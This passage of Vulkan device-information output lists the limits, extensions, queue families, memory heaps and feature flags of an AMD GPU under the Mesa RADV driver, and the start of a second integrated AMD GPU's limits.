	maxTessellationEvaluationInputComponents        = 128
	maxTessellationEvaluationOutputComponents       = 128
	maxGeometryShaderInvocations                    = 127
	maxGeometryInputComponents                      = 64
	maxGeometryOutputComponents                     = 128
	maxGeometryOutputVertices                       = 256
	maxGeometryTotalOutputComponents                = 1024
	maxFragmentInputComponents                      = 128
	maxFragmentOutputAttachments                    = 8
	maxFragmentDualSrcAttachments                   = 1
	maxFragmentCombinedOutputResources              = 8
	maxComputeSharedMemorySize                      = 32768
	maxComputeWorkGroupCount: count = 3
		65535
		65535
		65535
	maxComputeWorkGroupInvocations                  = 2048
	maxComputeWorkGroupSize: count = 3
		2048
		2048
		2048
	subPixelPrecisionBits                           = 8
	subTexelPrecisionBits                           = 8
	mipmapPrecisionBits                             = 8
	maxDrawIndexedIndexValue                        = 4294967295
	maxDrawIndirectCount                            = 4294967295
	maxSamplerLodBias                               = 16
	maxSamplerAnisotropy                            = 16
	maxViewports                                    = 16
	maxViewportDimensions: count = 2
		16384
		16384
	viewportBoundsRange: count = 2
		-32768
		32767
	viewportSubPixelBits                            = 8
	minMemoryMapAlignment                           = 4096
	minTexelBufferOffsetAlignment                   = 0x00000004
	minUniformBufferOffsetAlignment                 = 0x00000004
	minStorageBufferOffsetAlignment                 = 0x00000004
	minTexelOffset                                  = -32
	maxTexelOffset                                  = 31
	minTexelGatherOffset                            = -32
	maxTexelGatherOffset                            = 31
	minInterpolationOffset                          = -2
	maxInterpolationOffset                          = 2
	subPixelInterpolationOffsetBits                 = 8
	maxFramebufferWidth                             = 16384
	maxFramebufferHeight                            = 16384
	maxFramebufferLayers                            = 1024
	framebufferColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferNoAttachmentsSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxColorAttachments                             = 8
	sampledImageColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageIntegerSampleCounts:
		SAMPLE_COUNT_1_BIT
	sampledImageDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	storageImageSampleCounts:
		SAMPLE_COUNT_1_BIT
	maxSampleMaskWords                              = 1
	timestampComputeAndGraphics                     = true
	timestampPeriod                                 = 20.8333
	maxClipDistances                                = 8
	maxCullDistances                                = 8
	maxCombinedClipAndCullDistances                 = 8
	discreteQueuePriorities                         = 2
	pointSizeRange: count = 2
		0
		8192
	lineWidthRange: count = 2
		0
		7.99219
	pointSizeGranularity                            = 0.125
	lineWidthGranularity                            = 0.0078125
	strictLines                                     = false
	standardSampleLocations                         = true
	optimalBufferCopyOffsetAlignment                = 0x00000080
	optimalBufferCopyRowPitchAlignment              = 0x00000080
	nonCoherentAtomSize                             = 0x00000040

VkPhysicalDeviceSparseProperties:
---------------------------------
	residencyStandard2DBlockShape            = false
	residencyStandard2DMultisampleBlockShape = false
	residencyStandard3DBlockShape            = false
	residencyAlignedMipSize                  = false
	residencyNonResidentStrict               = false

VkPhysicalDeviceDepthStencilResolvePropertiesKHR:
-------------------------------------------------
	supportedDepthResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_AVERAGE_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	supportedStencilResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	independentResolveNone = true
	independentResolve     = true

VkPhysicalDeviceDescriptorIndexingPropertiesEXT:
------------------------------------------------
	maxUpdateAfterBindDescriptorsInAllPools              = 67108863
	shaderUniformBufferArrayNonUniformIndexingNative     = false
	shaderSampledImageArrayNonUniformIndexingNative      = false
	shaderStorageBufferArrayNonUniformIndexingNative     = false
	shaderStorageImageArrayNonUniformIndexingNative      = false
	shaderInputAttachmentArrayNonUniformIndexingNative   = false
	robustBufferAccessUpdateAfterBind                    = false
	quadDivergentImplicitLod                             = false
	maxPerStageDescriptorUpdateAfterBindSamplers         = 8388606
	maxPerStageDescriptorUpdateAfterBindUniformBuffers   = 8388606
	maxPerStageDescriptorUpdateAfterBindStorageBuffers   = 8388606
	maxPerStageDescriptorUpdateAfterBindSampledImages    = 8388606
	maxPerStageDescriptorUpdateAfterBindStorageImages    = 8388606
	maxPerStageDescriptorUpdateAfterBindInputAttachments = 8388606
	maxPerStageUpdateAfterBindResources                  = 8388606
	maxDescriptorSetUpdateAfterBindSamplers              = 8388606
	maxDescriptorSetUpdateAfterBindUniformBuffers        = 8388606
	maxDescriptorSetUpdateAfterBindUniformBuffersDynamic = 16
	maxDescriptorSetUpdateAfterBindStorageBuffers        = 8388606
	maxDescriptorSetUpdateAfterBindStorageBuffersDynamic = 8
	maxDescriptorSetUpdateAfterBindSampledImages         = 8388606
	maxDescriptorSetUpdateAfterBindStorageImages         = 8388606
	maxDescriptorSetUpdateAfterBindInputAttachments      = 8388606

VkPhysicalDeviceDiscardRectanglePropertiesEXT:
----------------------------------------------
	maxDiscardRectangles = 4

VkPhysicalDeviceDriverPropertiesKHR:
------------------------------------
	driverID           = DRIVER_ID_MESA_RADV_KHR
	driverName         = radv
	driverInfo         = Mesa 19.2.3 (LLVM 9.0.0)
	conformanceVersion = 1.1.2.0

VkPhysicalDeviceExternalMemoryHostPropertiesEXT:
------------------------------------------------
	minImportedHostPointerAlignment = 0x00001000

VkPhysicalDeviceIDProperties:
-----------------------------
	deviceUUID      =  0000-00-00-10-000000
	driverUUID      = 414d442d-4d45-5341-2d44-52560000
	deviceNodeMask  = 0
	deviceLUIDValid = false

VkPhysicalDeviceInlineUniformBlockPropertiesEXT:
------------------------------------------------
	maxInlineUniformBlockSize                               = 4194304
	maxPerStageDescriptorInlineUniformBlocks                = 134217728
	maxPerStageDescriptorUpdateAfterBindInlineUniformBlocks = 134217728
	maxDescriptorSetInlineUniformBlocks                     = 64
	maxDescriptorSetUpdateAfterBindInlineUniformBlocks      = 64

VkPhysicalDeviceMaintenance3Properties:
---------------------------------------
	maxPerSetDescriptors    = 22369621
	maxMemoryAllocationSize = 0xffffffff

VkPhysicalDeviceMultiviewProperties:
------------------------------------
	maxMultiviewViewCount     = 8
	maxMultiviewInstanceIndex = 2147483647

VkPhysicalDevicePCIBusInfoPropertiesEXT:
----------------------------------------
	pciDomain   = 0
	pciBus      = 0
	pciDevice   = 1
	pciFunction = 0

VkPhysicalDevicePointClippingProperties:
----------------------------------------
	pointClippingBehavior = POINT_CLIPPING_BEHAVIOR_ALL_CLIP_PLANES

VkPhysicalDeviceProtectedMemoryProperties:
------------------------------------------
	protectedNoFault = false

VkPhysicalDevicePushDescriptorPropertiesKHR:
--------------------------------------------
	maxPushDescriptors = 32

VkPhysicalDeviceSampleLocationsPropertiesEXT:
---------------------------------------------
	sampleLocationSampleCounts:
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxSampleLocationGridSize:
		width  = 2
		height = 2
	sampleLocationCoordinateRange: count = 2
		0
		0.9375
	sampleLocationSubPixelBits       = 4
	variableSampleLocations          = false

VkPhysicalDeviceSamplerFilterMinmaxPropertiesEXT:
-------------------------------------------------
	filterMinmaxSingleComponentFormats = true
	filterMinmaxImageComponentMapping  = false

VkPhysicalDeviceSubgroupProperties:
-----------------------------------
	subgroupSize              = 64
	supportedStages:
		SHADER_STAGE_VERTEX_BIT
		SHADER_STAGE_TESSELLATION_CONTROL_BIT
		SHADER_STAGE_TESSELLATION_EVALUATION_BIT
		SHADER_STAGE_GEOMETRY_BIT
		SHADER_STAGE_FRAGMENT_BIT
		SHADER_STAGE_COMPUTE_BIT
		SHADER_STAGE_ALL_GRAPHICS
		SHADER_STAGE_ALL
		SHADER_STAGE_RAYGEN_BIT_NV
		SHADER_STAGE_ANY_HIT_BIT_NV
		SHADER_STAGE_CLOSEST_HIT_BIT_NV
		SHADER_STAGE_MISS_BIT_NV
		SHADER_STAGE_INTERSECTION_BIT_NV
		SHADER_STAGE_CALLABLE_BIT_NV
		SHADER_STAGE_TASK_BIT_NV
		SHADER_STAGE_MESH_BIT_NV
	supportedOperations:
		SUBGROUP_FEATURE_BASIC_BIT
		SUBGROUP_FEATURE_VOTE_BIT
		SUBGROUP_FEATURE_BALLOT_BIT
		SUBGROUP_FEATURE_QUAD_BIT
	quadOperationsInAllStages = true

VkPhysicalDeviceTransformFeedbackPropertiesEXT:
-----------------------------------------------
	maxTransformFeedbackStreams                = 4
	maxTransformFeedbackBuffers                = 4
	maxTransformFeedbackBufferSize             = 0xffffffff
	maxTransformFeedbackStreamDataSize         = 512
	maxTransformFeedbackBufferDataSize         = 4294967295
	maxTransformFeedbackBufferDataStride       = 512
	transformFeedbackQueries                   = true
	transformFeedbackStreamsLinesTriangles     = true
	transformFeedbackRasterizationStreamSelect = false
	transformFeedbackDraw                      = true

VkPhysicalDeviceVertexAttributeDivisorPropertiesEXT:
----------------------------------------------------
	maxVertexAttribDivisor = 4294967295


Device Extensions: count = 71
	VK_AMD_buffer_marker                  : extension revision 1
	VK_AMD_draw_indirect_count            : extension revision 1
	VK_AMD_gcn_shader                     : extension revision 1
	VK_AMD_shader_core_properties         : extension revision 1
	VK_AMD_shader_info                    : extension revision 1
	VK_AMD_shader_trinary_minmax          : extension revision 1
	VK_EXT_buffer_device_address          : extension revision 1
	VK_EXT_calibrated_timestamps          : extension revision 1
	VK_EXT_conditional_rendering          : extension revision 1
	VK_EXT_depth_clip_enable              : extension revision 1
	VK_EXT_depth_range_unrestricted       : extension revision 1
	VK_EXT_descriptor_indexing            : extension revision 2
	VK_EXT_discard_rectangles             : extension revision 1
	VK_EXT_display_control                : extension revision 1
	VK_EXT_external_memory_dma_buf        : extension revision 1
	VK_EXT_external_memory_host           : extension revision 1
	VK_EXT_global_priority                : extension revision 1
	VK_EXT_host_query_reset               : extension revision 1
	VK_EXT_inline_uniform_block           : extension revision 1
	VK_EXT_memory_budget                  : extension revision 1
	VK_EXT_memory_priority                : extension revision 1
	VK_EXT_pci_bus_info                   : extension revision 2
	VK_EXT_pipeline_creation_feedback     : extension revision 1
	VK_EXT_queue_family_foreign           : extension revision 1
	VK_EXT_sample_locations               : extension revision 1
	VK_EXT_sampler_filter_minmax          : extension revision 1
	VK_EXT_scalar_block_layout            : extension revision 1
	VK_EXT_shader_stencil_export          : extension revision 1
	VK_EXT_shader_subgroup_ballot         : extension revision 1
	VK_EXT_shader_subgroup_vote           : extension revision 1
	VK_EXT_shader_viewport_index_layer    : extension revision 1
	VK_EXT_transform_feedback             : extension revision 1
	VK_EXT_vertex_attribute_divisor       : extension revision 3
	VK_EXT_ycbcr_image_arrays             : extension revision 1
	VK_GOOGLE_decorate_string             : extension revision 1
	VK_GOOGLE_hlsl_functionality1         : extension revision 1
	VK_KHR_16bit_storage                  : extension revision 1
	VK_KHR_bind_memory2                   : extension revision 1
	VK_KHR_create_renderpass2             : extension revision 1
	VK_KHR_dedicated_allocation           : extension revision 1
	VK_KHR_depth_stencil_resolve          : extension revision 1
	VK_KHR_descriptor_update_template     : extension revision 1
	VK_KHR_device_group                   : extension revision 1
	VK_KHR_draw_indirect_count            : extension revision 1
	VK_KHR_driver_properties              : extension revision 1
	VK_KHR_external_fence                 : extension revision 1
	VK_KHR_external_fence_fd              : extension revision 1
	VK_KHR_external_memory                : extension revision 1
	VK_KHR_external_memory_fd             : extension revision 1
	VK_KHR_external_semaphore             : extension revision 1
	VK_KHR_external_semaphore_fd          : extension revision 1
	VK_KHR_get_memory_requirements2       : extension revision 1
	VK_KHR_image_format_list              : extension revision 1
	VK_KHR_imageless_framebuffer          : extension revision 1
	VK_KHR_incremental_present            : extension revision 1
	VK_KHR_maintenance1                   : extension revision 1
	VK_KHR_maintenance2                   : extension revision 1
	VK_KHR_maintenance3                   : extension revision 1
	VK_KHR_multiview                      : extension revision 1
	VK_KHR_pipeline_executable_properties : extension revision 1
	VK_KHR_push_descriptor                : extension revision 1
	VK_KHR_relaxed_block_layout           : extension revision 1
	VK_KHR_sampler_mirror_clamp_to_edge   : extension revision 1
	VK_KHR_sampler_ycbcr_conversion       : extension revision 1
	VK_KHR_shader_atomic_int64            : extension revision 1
	VK_KHR_shader_draw_parameters         : extension revision 1
	VK_KHR_shader_float16_int8            : extension revision 1
	VK_KHR_storage_buffer_storage_class   : extension revision 1
	VK_KHR_swapchain                      : extension revision 68
	VK_KHR_uniform_buffer_standard_layout : extension revision 1
	VK_KHR_variable_pointers              : extension revision 1

VkQueueFamilyProperties[0]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 1
	queueFlags                  = QUEUE_GRAPHICS | QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkQueueFamilyProperties[1]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 4
	queueFlags                  = QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkPhysicalDeviceMemoryProperties:
=================================
memoryHeaps: count = 2
	memoryHeaps[0]:
		size   = 1073741824 (0x40000000) (1024.00 MiB)
		budget = 974553088
		usage  = 0
		flags:
			MEMORY_HEAP_DEVICE_LOCAL_BIT
	memoryHeaps[1]:
		size   = 3221225472 (0xc0000000) (3.00 GiB)
		budget = 3205656576
		usage  = 0
		flags:
			MEMORY_HEAP_DEVICE_LOCAL_BIT
memoryTypes: count = 3
	memoryTypes[0]:
		heapIndex     = 0
		propertyFlags = 0x0007:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[1]:
		heapIndex     = 1
		propertyFlags = 0x0007:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[2]:
		heapIndex     = 1
		propertyFlags = 0x000f:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
			MEMORY_PROPERTY_HOST_CACHED_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images

VkPhysicalDeviceFeatures:
=========================
	robustBufferAccess                      = true
	fullDrawIndexUint32                     = true
	imageCubeArray                          = true
	independentBlend                        = true
	geometryShader                          = true
	tessellationShader                      = true
	sampleRateShading                       = true
	dualSrcBlend                            = true
	logicOp                                 = true
	multiDrawIndirect                       = true
	drawIndirectFirstInstance               = true
	depthClamp                              = true
	depthBiasClamp                          = true
	fillModeNonSolid                        = true
	depthBounds                             = true
	wideLines                               = true
	largePoints                             = true
	alphaToOne                              = true
	multiViewport                           = true
	samplerAnisotropy                       = true
	textureCompressionETC2                  = false
	textureCompressionASTC_LDR              = false
	textureCompressionBC                    = true
	occlusionQueryPrecise                   = true
	pipelineStatisticsQuery                 = true
	vertexPipelineStoresAndAtomics          = true
	fragmentStoresAndAtomics                = true
	shaderTessellationAndGeometryPointSize  = true
	shaderImageGatherExtended               = true
	shaderStorageImageExtendedFormats       = true
	shaderStorageImageMultisample           = false
	shaderStorageImageReadWithoutFormat     = true
	shaderStorageImageWriteWithoutFormat    = true
	shaderUniformBufferArrayDynamicIndexing = true
	shaderSampledImageArrayDynamicIndexing  = true
	shaderStorageBufferArrayDynamicIndexing = true
	shaderStorageImageArrayDynamicIndexing  = true
	shaderClipDistance                      = true
	shaderCullDistance                      = true
	shaderFloat64                           = true
	shaderInt64                             = true
	shaderInt16                             = false
	shaderResourceResidency                 = false
	shaderResourceMinLod                    = false
	sparseBinding                           = true
	sparseResidencyBuffer                   = false
	sparseResidencyImage2D                  = false
	sparseResidencyImage3D                  = false
	sparseResidency2Samples                 = false
	sparseResidency4Samples                 = false
	sparseResidency8Samples                 = false
	sparseResidency16Samples                = false
	sparseResidencyAliased                  = false
	variableMultisampleRate                 = true
	inheritedQueries                        = true

VkPhysicalDevice16BitStorageFeatures:
-------------------------------------
	storageBuffer16BitAccess           = false
	uniformAndStorageBuffer16BitAccess = false
	storagePushConstant16              = false
	storageInputOutput16               = false

VkPhysicalDeviceBufferDeviceAddressFeaturesEXT:
-----------------------------------------------
	bufferDeviceAddress              = true
	bufferDeviceAddressCaptureReplay = false
	bufferDeviceAddressMultiDevice   = false

VkPhysicalDeviceConditionalRenderingFeaturesEXT:
------------------------------------------------
	conditionalRendering          = true
	inheritedConditionalRendering = false

VkPhysicalDeviceDepthClipEnableFeaturesEXT:
-------------------------------------------
	depthClipEnable = true

VkPhysicalDeviceDescriptorIndexingFeaturesEXT:
----------------------------------------------
	shaderInputAttachmentArrayDynamicIndexing          = true
	shaderUniformTexelBufferArrayDynamicIndexing       = true
	shaderStorageTexelBufferArrayDynamicIndexing       = true
	shaderUniformBufferArrayNonUniformIndexing         = true
	shaderSampledImageArrayNonUniformIndexing          = true
	shaderStorageBufferArrayNonUniformIndexing         = true
	shaderStorageImageArrayNonUniformIndexing          = true
	shaderInputAttachmentArrayNonUniformIndexing       = true
	shaderUniformTexelBufferArrayNonUniformIndexing    = true
	shaderStorageTexelBufferArrayNonUniformIndexing    = true
	descriptorBindingUniformBufferUpdateAfterBind      = true
	descriptorBindingSampledImageUpdateAfterBind       = true
	descriptorBindingStorageImageUpdateAfterBind       = true
	descriptorBindingStorageBufferUpdateAfterBind      = true
	descriptorBindingUniformTexelBufferUpdateAfterBind = true
	descriptorBindingStorageTexelBufferUpdateAfterBind = true
	descriptorBindingUpdateUnusedWhilePending          = true
	descriptorBindingPartiallyBound                    = true
	descriptorBindingVariableDescriptorCount           = true
	runtimeDescriptorArray                             = true

VkPhysicalDeviceHostQueryResetFeaturesEXT:
------------------------------------------
	hostQueryReset = true

VkPhysicalDeviceImagelessFramebufferFeaturesKHR:
------------------------------------------------
	imagelessFramebuffer = true

VkPhysicalDeviceInlineUniformBlockFeaturesEXT:
----------------------------------------------
	inlineUniformBlock                                 = true
	descriptorBindingInlineUniformBlockUpdateAfterBind = true

VkPhysicalDeviceMemoryPriorityFeaturesEXT:
------------------------------------------
	memoryPriority = true

VkPhysicalDeviceMultiviewFeatures:
----------------------------------
	multiview                   = true
	multiviewGeometryShader     = true
	multiviewTessellationShader = true

VkPhysicalDevicePipelineExecutablePropertiesFeaturesKHR:
--------------------------------------------------------
	pipelineExecutableInfo = true

VkPhysicalDeviceProtectedMemoryFeatures:
----------------------------------------
	protectedMemory = false

VkPhysicalDeviceSamplerYcbcrConversionFeatures:
-----------------------------------------------
	samplerYcbcrConversion = true

VkPhysicalDeviceScalarBlockLayoutFeaturesEXT:
---------------------------------------------
	scalarBlockLayout = true

VkPhysicalDeviceShaderAtomicInt64FeaturesKHR:
---------------------------------------------
	shaderBufferInt64Atomics = true
	shaderSharedInt64Atomics = true

VkPhysicalDeviceShaderDrawParametersFeatures:
---------------------------------------------
	shaderDrawParameters = true

VkPhysicalDeviceShaderFloat16Int8FeaturesKHR:
---------------------------------------------
	shaderFloat16 = false
	shaderInt8    = true

VkPhysicalDeviceTransformFeedbackFeaturesEXT:
---------------------------------------------
	transformFeedback = true
	geometryStreams   = true

VkPhysicalDeviceUniformBufferStandardLayoutFeaturesKHR:
-------------------------------------------------------
	uniformBufferStandardLayout = true

VkPhysicalDeviceVariablePointersFeatures:
-----------------------------------------
	variablePointersStorageBuffer = true
	variablePointers              = true

VkPhysicalDeviceVertexAttributeDivisorFeaturesEXT:
--------------------------------------------------
	vertexAttributeInstanceRateDivisor     = true
	vertexAttributeInstanceRateZeroDivisor = true

VkPhysicalDeviceYcbcrImageArraysFeaturesEXT:
--------------------------------------------
	ycbcrImageArrays = true


GPU1:
VkPhysicalDeviceProperties:
---------------------------
	apiVersion     = 4198521 (1.1.121)
	driverVersion  = 8388723 (0x800073)
	vendorID       = 0x1002
	deviceID       = 0x9851
	deviceType     = PHYSICAL_DEVICE_TYPE_INTEGRATED_GPU
	deviceName     = Unknown AMD GPU

VkPhysicalDeviceLimits:
-----------------------
	maxImageDimension1D                             = 16384
	maxImageDimension2D                             = 16384
	maxImageDimension3D                             = 2048
	maxImageDimensionCube                           = 16384
	maxImageArrayLayers                             = 2048
	maxTexelBufferElements                          = 4294967295
	maxUniformBufferRange                           = 4294967295
	maxStorageBufferRange                           = 4294967295
	maxPushConstantsSize                            = 128
	maxMemoryAllocationCount                        = 4294967295
	maxSamplerAllocationCount                       = 1048576
	bufferImageGranularity                          = 0x00000001
	sparseAddressSpaceSize                          = 0xcffe00000
	maxBoundDescriptorSets                          = 32
	maxPerStageDescriptorSamplers                   = 4294967295
	maxPerStageDescriptorUniformBuffers             = 4294967295
	maxPerStageDescriptorStorageBuffers             = 4294967295
	maxPerStageDescriptorSampledImages              = 4294967295
	maxPerStageDescriptorStorageImages              = 4294967295
	maxPerStageDescriptorInputAttachments           = 4294967295
	maxPerStageResources                            = 4294967295
	maxDescriptorSetSamplers                        = 4294967295
	maxDescriptorSetUniformBuffers                  = 4294967295
	maxDescriptorSetUniformBuffersDynamic           = 8
	maxDescriptorSetStorageBuffers                  = 4294967295
	maxDescriptorSetStorageBuffersDynamic           = 8
	maxDescriptorSetSampledImages                   = 4294967295
	maxDescriptorSetStorageImages                   = 4294967295
	maxDescriptorSetInputAttachments                = 4294967295
	maxVertexInputAttributes                        = 64
	maxVertexInputBindings                          = 32
	maxVertexInputAttributeOffset                   = 4294967295
	maxVertexInputBindingStride                     = 16383
	maxVertexOutputComponents                       = 128
	maxTessellationGenerationLevel                  = 64
	maxTessellationPatchSize                        = 32
	maxTessellationControlPerVertexInputComponents  = 128
	maxTessellationControlPerVertexOutputComponents = 128
	maxTessellationControlPerPatchOutputComponents  = 120
	maxTessellationControlTotalOutputComponents     = 4096
	maxTessellationEvaluationInputComponents        = 128
	maxTessellationEvaluationOutputComponents       = 128
	maxGeometryShaderInvocations                    = 127
	maxGeometryInputComponents                      = 128
	maxGeometryOutputComponents                     = 128
	maxGeometryOutputVertices                       = 1024
	maxGeometryTotalOutputComponents                = 16384
	maxFragmentInputComponents                      = 128
	maxFragmentOutputAttachments                    = 8
	maxFragmentDualSrcAttachments                   = 1
	maxFragmentCombinedOutputResources              = 4294967295
	maxComputeSharedMemorySize                      = 32768
	maxComputeWorkGroupCount: count = 3
		65535
		65535
		65535
	maxComputeWorkGroupInvocations                  = 1024
	maxComputeWorkGroupSize: count = 3
		1024
		1024
		1024
	subPixelPrecisionBits                           = 8
	subTexelPrecisionBits                           = 8
	mipmapPrecisionBits                             = 8
	maxDrawIndexedIndexValue                        = 4294967295
	maxDrawIndirectCount                            = 4294967295
	maxSamplerLodBias                               = 15.9961
	maxSamplerAnisotropy                            = 16
	maxViewports                                    = 16
	maxViewportDimensions: count = 2
		16384
		16384
	viewportBoundsRange: count = 2
		-32768
		32767
	viewportSubPixelBits                            = 8
	minMemoryMapAlignment                           = 64
	minTexelBufferOffsetAlignment                   = 0x00000004
	minUniformBufferOffsetAlignment                 = 0x00000010
	minStorageBufferOffsetAlignment                 = 0x00000004
	minTexelOffset                                  = -64
	maxTexelOffset                                  = 63
	minTexelGatherOffset                            = -32
	maxTexelGatherOffset                            = 31
	minInterpolationOffset                          = -2
	maxInterpolationOffset                          = 2
	subPixelInterpolationOffsetBits                 = 8
	maxFramebufferWidth                             = 16384
	maxFramebufferHeight                            = 16384
	maxFramebufferLayers                            = 2048
	framebufferColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	framebufferNoAttachmentsSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxColorAttachments                             = 8
	sampledImageColorSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageIntegerSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageDepthSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	sampledImageStencilSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	storageImageSampleCounts:
		SAMPLE_COUNT_1_BIT
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxSampleMaskWords                              = 1
	timestampComputeAndGraphics                     = true
	timestampPeriod                                 = 20.8333
	maxClipDistances                                = 8
	maxCullDistances                                = 8
	maxCombinedClipAndCullDistances                 = 8
	discreteQueuePriorities                         = 2
	pointSizeRange: count = 2
		0
		8191.88
	lineWidthRange: count = 2
		0
		8191.88
	pointSizeGranularity                            = 0.125
	lineWidthGranularity                            = 0.125
	strictLines                                     = false
	standardSampleLocations                         = true
	optimalBufferCopyOffsetAlignment                = 0x00000001
	optimalBufferCopyRowPitchAlignment              = 0x00000001
	nonCoherentAtomSize                             = 0x00000080

VkPhysicalDeviceSparseProperties:
---------------------------------
	residencyStandard2DBlockShape            = true
	residencyStandard2DMultisampleBlockShape = false
	residencyStandard3DBlockShape            = false
	residencyAlignedMipSize                  = false
	residencyNonResidentStrict               = true

VkPhysicalDeviceDepthStencilResolvePropertiesKHR:
-------------------------------------------------
	supportedDepthResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	supportedStencilResolveModes:
		RESOLVE_MODE_SAMPLE_ZERO_BIT_KHR
		RESOLVE_MODE_MIN_BIT_KHR
		RESOLVE_MODE_MAX_BIT_KHR
	independentResolveNone = true
	independentResolve     = true

VkPhysicalDeviceDescriptorIndexingPropertiesEXT:
------------------------------------------------
	maxUpdateAfterBindDescriptorsInAllPools              = 4294967295
	shaderUniformBufferArrayNonUniformIndexingNative     = false
	shaderSampledImageArrayNonUniformIndexingNative      = false
	shaderStorageBufferArrayNonUniformIndexingNative     = false
	shaderStorageImageArrayNonUniformIndexingNative      = false
	shaderInputAttachmentArrayNonUniformIndexingNative   = false
	robustBufferAccessUpdateAfterBind                    = false
	quadDivergentImplicitLod                             = false
	maxPerStageDescriptorUpdateAfterBindSamplers         = 4294967295
	maxPerStageDescriptorUpdateAfterBindUniformBuffers   = 4294967295
	maxPerStageDescriptorUpdateAfterBindStorageBuffers   = 4294967295
	maxPerStageDescriptorUpdateAfterBindSampledImages    = 4294967295
	maxPerStageDescriptorUpdateAfterBindStorageImages    = 4294967295
	maxPerStageDescriptorUpdateAfterBindInputAttachments = 4294967295
	maxPerStageUpdateAfterBindResources                  = 4294967295
	maxDescriptorSetUpdateAfterBindSamplers              = 4294967295
	maxDescriptorSetUpdateAfterBindUniformBuffers        = 4294967295
	maxDescriptorSetUpdateAfterBindUniformBuffersDynamic = 8
	maxDescriptorSetUpdateAfterBindStorageBuffers        = 4294967295
	maxDescriptorSetUpdateAfterBindStorageBuffersDynamic = 8
